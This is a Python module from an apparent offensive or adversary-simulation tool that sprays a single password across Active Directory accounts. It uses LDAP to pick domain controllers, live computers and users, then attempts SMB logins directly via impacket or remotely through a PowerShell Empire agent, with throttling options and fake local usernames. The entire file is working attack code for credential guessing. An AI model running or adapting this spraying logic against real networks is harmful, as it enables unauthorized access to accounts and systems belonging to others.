import time
from src.ldap import *
from src.auth import smb_login

from src.core import print_warning, print_status, print_error, print_info,print_failed_auth, print_succ_auth
from src.helpers import  *

def impacket_spray(domain, duser, dpass, dc_ip, nusers, sleep, UseDomainAct, spraypassword, type):

    if int(type) == 0:
        impacket_spray_1(duser, dpass, domain, dc_ip, nusers, sleep, spraypassword, UseDomainAct)
    elif int(type) == 1:
        impacket_spray_2(duser, dpass, domain, dc_ip, nusers, sleep, spraypassword, UseDomainAct)
    elif int(type) == 2:
        impacket_spray_3(duser, dpass, domain, dc_ip, nusers, sleep, spraypassword, UseDomainAct)


def impacket_spray_1(duser, dpass, domain, dc_ip, nusers, sleep, spraypassword, UseDomainAct=True, ):
    ## Against the DC

    print_info("Querying for Domain Controllers...")
    dcs =get_dcs(duser, dpass, domain, dc_ip)

    dcs = get_live_hosts(domain,dcs,dc_ip)

    dc = random.choice(dcs)
    print_status("Randomly picked DC : "+dc[0]+" -  "+dc[1])

    if UseDomainAct:

        print_info("Querying for domain users with badPwdCount>=3...")
        try:
            users = random.sample(set(get_users(duser, dpass, domain, dc_ip)), nusers)
        except:
            print_error("Did not find enough users, try a lower Nusers value")
            return
        print_status("Using " + str(len(users)) + " randomly picked domain users for the spray...")
        if sleep > 0:
            print_status("Sleeping " + str((sleep)) + " seconds between each authentication attempt...")
        smb_login(domain, users, spraypassword, dc, sleep)


    else:
        users = generate_random_users(nusers)
        print_info("Using "+str(len(users))+" randomly generated usernames (mimic local account usage) ...")
        if sleep > 0:
            print_status("Sleeping " + str((sleep)) + " seconds between each authentication attempt...")
        smb_login("", users, spraypassword, dc, sleep)


def impacket_spray_2(duser, dpass, domain, dc_ip, nusers, sleep, spraypassword,  UseDomainAct=True):
    ## Against one random host on the domain

    print_info("Querying for domain computers that authenticated within the last day...")
    try:
        computers = random.sample(set(get_computers(duser, dpass, domain, dc_ip)), nusers)
    except:
        print_error("Did not find enough computers, try a lower Nusers value")
        return
    print_status("Obtained " + str(len(computers)) + " computers.")
    print_info("Identifying live hosts ...")

    computers=get_live_hosts(domain,computers,dc_ip)

    host = random.choice(computers)
    print_status("Randomly picked domain computer : " + host[0] + " -  " + host[1])

    if UseDomainAct:
        print_info("Querying for domain users with badPwdCount>=3...")
        try:
            users = random.sample(set(get_users(duser, dpass, domain, dc_ip)), nusers)
        except:
            print_error("Did not find enough users, try a lower Nusers value")
            return
        print_status("Using " + str(len(users)) + " randomly picked domain users for the spray.")
        if sleep > 0:
            print_status("Sleeping " + str((sleep)) + " seconds between each authentication attempt...")
        smb_login(domain, users, spraypassword, host, sleep)


    else:
        users = generate_random_users(nusers)
        print_info("Using " + str(len(users)) + " randomly generated usernames (mimic local account usage) ...")
        if sleep > 0:
            print_status("Sleeping " + str((sleep)) + " seconds between each authentication attempt...")
        smb_login("", users, spraypassword, host, sleep)

def impacket_spray_3(duser, dpass, domain, dc_ip, nusers, sleep, spraypassword, UseDomainAct=True):
    ## Against several random hosts on the domain. Un authentication per host.

    if UseDomainAct:
        print_info("Querying for domain users with badPwdCount>=3...")
        try:
            users = random.sample(set(get_users(duser, dpass, domain, dc_ip)), nusers)
        except:
            print_error("Did not find enough users, try a lower Nusers value")
            return
        print_status("Using " + str(len(users)) + " randomly picked domain users for the spray...")
    else:
        users = generate_random_users(nusers)
        print_info("Using " + str(len(users)) + " randomly generated usernames (mimicking local accounts) ...")

    print_info("Querying for domain computers that authenticated within the last day...")
    try:
        computers = random.sample(set(get_computers(duser, dpass, domain, dc_ip)), nusers)
    except:
        print_error("Did not find enough computers, try a lower Nusers value")
        return
    print_status("Obtained " + str(len(computers)) + " computers.")
    print_info("Identifying live hosts ...")
    computers = get_live_hosts(domain, computers, dc_ip)
    print_status("Using " + str(len(computers)) + " randomly picked domain computers for the spray...")
    if sleep > 0:
        print_status("Sleeping " + str((sleep)) + " seconds between each authentication attempt...")

    if nusers > len(computers):
        users = users[:len(computers)]

    for idx, user in enumerate(users):
        smb_login(domain, user, spraypassword, computers[idx], sleep) if UseDomainAct else smb_login("", user, spraypassword, computers[idx], sleep)


def empire_spray(empiresession, agentid, domain, duser, dpass, dc_hostname, nusers, type, spraypassword, sleep, UseDomainAct=True, UseKerberos=True):

    if int(type) == 0:
        empire_spray_1(empiresession, agentid, duser, dpass, domain, dc_hostname, nusers, spraypassword, sleep, UseDomainAct, UseKerberos)
    elif int(type) == 1:
        empire_spray_2(empiresession, agentid, duser, dpass, domain, dc_hostname, nusers, spraypassword, sleep, UseDomainAct, UseKerberos)
    elif int(type) == 2:
        empire_spray_3(empiresession, agentid, duser, dpass, domain, dc_hostname, nusers, spraypassword, sleep, UseDomainAct, UseKerberos)


def empire_spray_1(empiresession, agentid, duser, dpass, domain, dc_ip, nusers, spraypassword, sleep, UseDomainAct=True, UseKerberos=True):
    ## Against the DC
    print_info("Querying for Domain Controllers...")
    dcs = get_dcs(duser, dpass, domain, dc_ip)
    dcs = get_live_hosts(domain,dcs,dc_ip)
    dc = random.choice(dcs)
    print_status("Randomly picked DC : "+dc[0]+" -  "+dc[1])
    computername = dc[0] if UseKerberos else dc[1]

    if UseDomainAct:

        print_info("Querying for domain users with badPwdCount>=3...")
        try:
            users = random.sample(set(get_users(duser, dpass, domain, dc_ip)), nusers)
        except:
            print_error("Did not find enough users, try a lower Nusers value")
            return
        print_status("Using " + str(len(users)) + " randomly picked domain users for the spray...")

    else:
        users = generate_random_users(nusers)
        print_info("Using " + str(len(users)) + " randomly generated usernames (mimic local account usage) ...")

    usernames=[]

    for user in users:

        usernames.append(user if UseDomainAct else generate_random_users(1)[0])

    usernames=",".join(usernames)

    if sleep > 0:
        print_status("Sleeping " + str((sleep)) + " seconds between each authentication attempt...")

    module_options = {'UserName': "\"" + usernames + "\"", 'ComputerName': computername, 'Password': spraypassword, 'Domain':domain, 'Sleep':str(sleep)} if UseDomainAct else {'UserName': "\"" + usernames + "\"", 'ComputerName': computername, 'Password': spraypassword, 'Domain':'', 'Sleep':str(sleep)}

    results=empiresession.execute_module_with_results("powershell/situational_awareness/network/smblogin", agentid, module_options)
    print_status("Obtained results from the Powershell Empire agent")

    process_empire_results(results,dc)

def empire_spray_2(empiresession, agentid, duser, dpass, domain, dc_ip, nusers, spraypassword, sleep, UseDomainAct=True, UseKerberos=True):
    ## Against one random host on the domain

    print_info("Querying for domain computers that authenticated within the last day...")
    try:
        computers = random.sample(set(get_computers(duser, dpass, domain, dc_ip)), nusers)
    except:
        print_error("Did not find enough computers, try a lower Nusers value")
        return
    print_status("Obtained " + str(len(computers)) + " computers.")
    print_info("Identifying live hosts ...")
    computers = get_live_hosts(domain,computers,dc_ip)

    host = random.choice(computers)
    print_status("Randomly picked domain computer : " + host[0] + " -  " + host[1])
    computername = host[0] if UseKerberos else host[1]

    if UseDomainAct:

        print_info("Querying for domain users with badPwdCount>=3...")
        try:
            users = random.sample(set(get_users(duser, dpass, domain, dc_ip)), nusers)
        except:
            print_error("Did not find enough users, try a lower Nusers value")
            return
        print_status("Using " + str(len(users)) + " randomly picked domain users for the spray.")

    else:

        users = generate_random_users(nusers)
        print_info("Using " + str(len(users)) + " randomly generated usernames (mimic local account usage) ...")

    usernames = []

    for user in users:

        usernames.append(user if UseDomainAct else generate_random_users(10)[0])

    usernames = ",".join(usernames)
    if sleep > 0:
        print_status("Sleeping " + str((sleep)) + " seconds between each authentication attempt...")


    module_options = {'UserName': "\"" + usernames + "\"", 'ComputerName': computername, 'Password': spraypassword,
                      'Domain': domain, 'Sleep':str(sleep)} if UseDomainAct else {'UserName': "\"" + usernames + "\"", 'Domain':'',
                                                              'ComputerName': computername, 'Password': spraypassword,'Sleep':str(sleep)}

    results=empiresession.execute_module_with_results("powershell/situational_awareness/network/smblogin", agentid, module_options)
    print_status("Obtained results from the Powershell Empire agent")
    process_empire_results(results,host)


def empire_spray_3(empiresession, agentid, duser, dpass, domain, dc_ip, nusers, spraypassowrd, sleep, UseDomainAct=True, UseKerberos=True):
    ## Against several random hosts on the domain. One authentication per host.

    if UseDomainAct:
        print_info("Querying for domain users with badPwdCount>=3...")
        #users = random.sample(set(get_users(duser, dpass, domain, dc_ip)), nusers)
        try:
            users = random.sample(set(get_users(duser, dpass, domain, dc_ip)), nusers)
        except:
            print_error("Did not find enough users, try a lower Nusers value")
            return
        print_status("Using " + str(len(users)) + " randomly picked domain users for the spray...")

    else:
        users = generate_random_users(nusers)
        print_info("Using " + str(len(users)) + " randomly generated usernames (mimic local account usage) ...")

    print_info("Querying for domain computers that authenticated within the last day...")
    try:
        computers = random.sample(set(get_computers(duser, dpass, domain, dc_ip)), nusers)
    except:
        print_error("Did not find enough computers, try a lower Nusers value")
        return
    print_status("Obtained " + str(len(computers)) + " computers.")

    print_info("Identifying live hosts ...")
    computers=get_live_hosts(domain,computers,dc_ip)
    print_status("Using " + str(len(computers)) + " randomly picked domain computers for the spray...")
    if sleep > 0:
        print_status("Sleeping " + str((sleep)) + " seconds between each empire module execution...")

    if nusers > len(computers):
        users = users[:len(computers)]

    for idx, user in enumerate(users):
        duser = user if UseDomainAct else generate_random_users(1)[0]
        computername = computers[idx][0] if UseKerberos else computers[idx][1]
        module_options = {'UserName': duser, 'ComputerName': computername, 'Password': spraypassowrd,
                          'Domain': domain,'Sleep':'0'} if UseDomainAct else {'UserName': duser,'Domain':'',
                                                                  'ComputerName': computername, 'Password': spraypassowrd,'Sleep':'0'}

        results = empiresession.execute_module_with_results("powershell/situational_awareness/network/smblogin",
                                                            agentid, module_options)
        print_status("Obtained results from the Powershell Empire agent")
        process_empire_results(results,computers[idx])
        # In thise scenario, adding the sleep here instead of Invoke-SMBLogin
        if sleep > 0 :
            time.sleep(sleep)